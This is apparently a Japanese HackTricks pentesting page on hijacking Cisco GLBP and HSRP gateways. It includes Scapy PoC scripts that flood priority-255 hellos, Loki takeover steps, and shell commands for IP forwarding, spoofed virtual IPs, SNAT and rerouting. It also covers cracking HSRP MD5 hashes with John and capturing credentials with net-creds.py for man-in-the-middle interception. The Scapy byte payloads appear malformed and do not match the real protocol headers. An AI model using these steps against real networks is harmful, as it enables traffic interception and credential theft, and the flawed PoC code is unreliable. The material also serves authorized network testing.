# GLBP & HSRP 攻撃

{{#include ../../banners/hacktricks-training.md}}


## FHRP ハイジャックの概要

### FHRP に関する洞察

FHRP は複数のルータを単一の仮想ユニットとしてまとめることでネットワークの堅牢性を提供し、負荷分散と耐障害性を向上させることを目的としています。Cisco Systems はこのスイート内で GLBP や HSRP といった主要なプロトコルを導入しました。

### GLBP プロトコルの洞察

Cisco が作成した GLBP は TCP/IP スタック上で動作し、通信に UDP ポート 3222 を利用します。GLBP グループ内のルータは 3 秒間隔で "hello" パケットを交換します。ルータが 10 秒間これらのパケットを送信しない場合、そのルータはオフラインと見なされます。ただし、これらのタイマーは固定ではなく変更可能です。

IPv6 の GLBP は UDP/3222 上でマルチキャスト **FF02::66** を使用し、仮想 MAC フォーマットは `0007.b4xx.xxyy`（AVF ID は最下位バイトに入る）になります。タイミングや攻撃面は IPv4 と同様なので、デュアルスタック環境でもハイジャック手法は有効です。

### GLBP の動作と負荷分散

GLBP は単一の仮想 IP と複数の仮想 MAC アドレスを組み合わせることでルータ間の負荷分散を可能にします。GLBP グループでは、すべてのルータがパケット転送に関与します。HSRP/VRRP と異なり、GLBP は以下の複数のメカニズムを通じて真のロードバランシングを提供します:

- **Host-Dependent Load Balancing:** ホストに対して一貫した AVF MAC アドレス割り当てを維持し、安定した NAT 構成に重要です。
- **Round-Robin Load Balancing:** デフォルトの方式で、要求するホスト間で AVF MAC アドレスを順番に割り当てます。
- **Weighted Round-Robin Load Balancing:** 事前定義された "Weight" メトリクスに基づいて負荷を配分します。

### GLBP の主要コンポーネントと用語

- **AVG (Active Virtual Gateway):** ピアルータに MAC アドレスを割り当てる役割を持つ主要ルータ。
- **AVF (Active Virtual Forwarder):** ネットワークトラフィックを処理するために指名されたルータ。
- **GLBP Priority:** AVG を決定するメトリクスで、デフォルトは 100、範囲は 1〜255。
- **GLBP Weight:** ルータの現在の負荷を反映する値で、手動または Object Tracking によって調整可能。
- **GLBP Virtual IP Address:** 接続デバイス全てのデフォルトゲートウェイとして機能する仮想 IP。

相互作用のために、GLBP は予約マルチキャストアドレス 224.0.0.102 と UDP ポート 3222 を使用します。ルータは 3 秒間隔で "hello" パケットを送信し、10 秒間パケットが欠落すると非稼働と見なされます。

### GLBP の攻撃メカニズム

攻撃者は最高の priority 値（255）を持つ GLBP パケットを送信することでプライマリルータになれます。これにより DoS や MITM 攻撃が可能になり、トラフィックの傍受やリダイレクトが行われ得ます。

**実践的な GLBP ハイジャック (Scapy による短い PoC)**
```python
from scapy.all import *

vip = "10.10.100.254"          # learned from sniffing
pkt = IP(dst="224.0.0.102")/UDP(dport=3222,sport=3222)/Raw(
b"\x01\x00\xff\x64"      # Version=1, Opcode=Hello, Priority=255, Weight=100
)
send(pkt, iface="eth0", loop=1, inter=1)
```
GLBPヘッダ（version/opcode/priority/weight/VRID）を模倣するペイロードバイトを作成する。フレームをループさせることで、認証がなければAVG選挙に勝てる。

### Lokiを使ったGLBP攻撃の実行

[Loki](https://github.com/raizo62/loki_on_kali) は priority と weight を255に設定したパケットを注入してGLBP攻撃を実行できる。事前準備としては、virtual IPアドレス、認証の有無、ルータのpriority値などをWireshark等で収集する。

攻撃手順:

1. ネットワークインタフェースをpromiscuous modeに切り替え、IP forwardingを有効にする。
2. ターゲットのルータを特定し、そのIPを取得する。
3. Gratuitous ARPを生成する。
4. AVGを偽装して悪意あるGLBPパケットを注入する。
5. 攻撃者のネットワークインタフェースに、GLBPのvirtual IPを模したセカンダリIPアドレスを割り当てる。
6. 完全なトラフィック可視化のためSNATを実装する。
7. 元のAVGルータ経由でのインターネットアクセスを維持するようルーティングを調整する。

これらの手順により、攻撃者は "man in the middle" の位置を確立し、暗号化されていない通信や機密データを含むネットワークトラフィックを傍受・解析できるようになる。

デモ用に、必要なコマンドスニペットは以下の通り：
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Monitoring and intercepting traffic can be done using net-creds.py or similar tools to capture and analyze data flowing through the compromised network.

### HSRP Hijacking の受動的説明（コマンド詳細）

#### HSRP (Hot Standby Router/Redundancy Protocol) の概要

HSRP はネットワークゲートウェイの冗長化のために設計された Cisco 独自のプロトコルです。複数の物理ルーターを共有 IP アドレスを持つ単一の論理ユニットとして構成でき、この論理ユニットはトラフィックを制御するプライマリルーターによって管理されます。GLBP が priority や weight といったメトリクスでロードバランスを行うのと異なり、HSRP はトラフィック管理に単一の active router を利用します。

HSRPv1 はマルチキャスト **224.0.0.2** と仮想 MAC `0000.0c07.acXX` を使用します；HSRPv2 と IPv6 用の HSRPv2 は **224.0.0.102 / FF02::66** と仮想 MAC `0000.0c9f.fXXX` を使用します。UDP の宛先ポートは IPv4 で **1985**、IPv6 で **2029** です。

#### HSRP の役割と用語

- **HSRP Active Router**: ゲートウェイとして動作し、トラフィックの流れを管理するデバイス。
- **HSRP Standby Router**: アクティブルーターが故障した際に引き継ぐ準備ができているバックアップルーター。
- **HSRP Group**: 単一の耐障害性のある仮想ルーターを形成するために協調するルーターの集合。
- **HSRP MAC Address**: HSRP 設定内の論理ルーターに割り当てられる仮想 MAC アドレス。
- **HSRP Virtual IP Address**: 接続デバイスのデフォルトゲートウェイとして機能する HSRP グループの仮想 IP アドレス。

#### HSRP のバージョン

HSRP には HSRPv1 と HSRPv2 の 2 つのバージョンがあり、主にグループ容量、マルチキャスト IP の使用、仮想 MAC アドレス構造で異なります。プロトコルはサービス情報交換のために特定のマルチキャスト IP アドレスを使用し、Hello パケットは 3 秒ごとに送信されます。パケットが 10 秒間受信されない場合、そのルーターは非アクティブと見なされます。

#### HSRP 攻撃の仕組み

HSRP 攻撃は、最大の priority 値を注入して Active Router の役割を強制的に奪取することを含みます。これにより Man-In-The-Middle (MITM) 攻撃につながる可能性があります。攻撃前の重要な準備ステップとして、HSRP 設定に関する情報収集があり、これは Wireshark を使ったトラフィック解析で行うことができます。

**Quick HSRP takeover with Scapy**
```python
from scapy.all import *

vip = "10.10.100.1"
pkt = IP(dst="224.0.0.102")/UDP(sport=1985,dport=1985)/Raw(
b"\x00\x02\xff\x03\x00\x00\x00\x01"  # Hello, priority 255, group 1
)
send(pkt, iface="eth0", inter=1, loop=1)
```
認証が**設定されていない**場合、優先度の高い hellos を継続的に送信するとピアを *Speak*/*Listen* 状態に強制し、あなたを *Active* にさせてトラフィックを自分のホスト経由にリダイレクトできます。

**HSRP authentication の特殊ケース**

- レガシーな平文認証は容易になりすまし可能です。
- MD5 認証は HSRP ペイロードのみを保護するため、巧妙に作成したパケットで制御プレーンに対するレート制限や DoS を引き起こすことができます。NX-OS の一部リリースでは、認証済みグループに対する DoS を許していました（Cisco advisory CSCup11309 を参照）。
- 多くの ISP / VPS 共有 VLAN では HSRPv1 のマルチキャストがテナントから見えるため、認証がなければ参加してプリエンプト（preempt）できます。

#### HSRP 認証をバイパスする手順

1. .pcap ファイルとして HSRP データを含むネットワークトラフィックを保存します。
```shell
tcpdump -w hsrp_traffic.pcap
```
2. hsrp2john.py を使って .pcap ファイルから MD5 ハッシュを抽出します。
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. John the Ripper を使って MD5 ハッシュをクラッキングします。
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Loki を用いた HSRP Injection の実行**

1. Loki を起動して HSRP アドバタイズメントを検出します。
2. ネットワークインターフェースをプロミスキャスモードに設定し、IP フォワーディングを有効にします。
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Loki を使い対象ルータを指定し、解読した HSRP パスワードを入力して Active Router を偽装するための必要な設定を行います。
4. Active Router の役割を取得したら、ネットワークインターフェースと iptables を設定して正規のトラフィックを傍受します。
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. ルーティングテーブルを変更して、トラフィックを元の Active Router 経由にルーティングします。
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. 傍受したトラフィックから資格情報をキャプチャするために net-creds.py などのユーティリティを使用します。
```shell
sudo python2 net-creds.py -i eth0
```

これらの手順を実行すると、攻撃者はトラフィックを傍受・操作できる位置に置かれ、GLBP のハイジャック手順と同様の結果になります。これは HSRP のような冗長化プロトコルにおける脆弱性と、堅牢なセキュリティ対策の必要性を浮き彫りにします。

## References

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Cisco NX-OS HSRP authentication DoS (CSCup11309)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/Cisco-SA-20140611-CVE-2014-3295)
- [Reddit: HSRP seen on VPS shared VLANs](https://www.reddit.com/r/networking/comments/1h0v1aq/hsrp_seen_on_cloud_vlans_without_auth/)
{{#include ../../banners/hacktricks-training.md}}
